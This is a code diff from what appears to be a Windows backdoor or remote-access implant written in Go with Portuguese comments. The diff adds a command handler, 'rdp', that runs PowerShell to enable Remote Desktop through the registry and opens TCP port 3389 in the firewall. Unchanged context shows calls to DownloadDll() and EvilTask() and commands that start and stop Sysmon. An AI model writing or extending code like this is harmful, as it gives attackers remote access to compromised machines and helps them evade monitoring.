@@ -245,8 +245,26 @@ func startSysmonService() string {
 	return resposta
 }
 
-func main() {
+func enableRDP() string {
+	resposta := "All okay"
+	cmd1 := exec.Command("powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0")
+	err := cmd1.Run()
+	if err != nil {
+		resposta = "Not okay Error: " + err.Error()
+		return resposta
+	}
 
+	// Abrir a porta 3389 no Firewall
+	cmd2 := exec.Command("powershell", "-Command", "$fwPolicy = New-Object -ComObject HNetCfg.FwPolicy2; $profile = $fwPolicy.GetProfileByType(1); $rule = New-Object -ComObject HNetCfg.FwRule; $rule.Name = 'Área de Trabalho Remota'; $rule.Description = 'Regra para permitir conexões de Área de Trabalho Remota'; $rule.Protocol = 6; $rule.LocalPorts = '3389'; $rule.Direction = 1; $rule.Enabled = $true; $profile.FirewallRules.Add($rule)")
+	err = cmd2.Run()
+	if err != nil {
+		resposta = fmt.Sprintf("Falha ao abrir a porta 3389 no Firewall: %v", err)
+		return resposta
+	}
+
+	return resposta
+}
+func main() {
 	if runtime.GOOS == "windows" {
 		DownloadDll()
 		EvilTask()
@@ -283,6 +301,8 @@ func executaComando(comando string, indice int) (resposta string) {
 	comandoSeparado := helpers.SeparaComando(comando)
 	comandoBase := comandoSeparado[0]
 	switch comandoBase {
+	case "rdp":
+		resposta = enableRDP()
 	case "startsys":
 		resposta = startSysmonService()
 	case "stopsys":
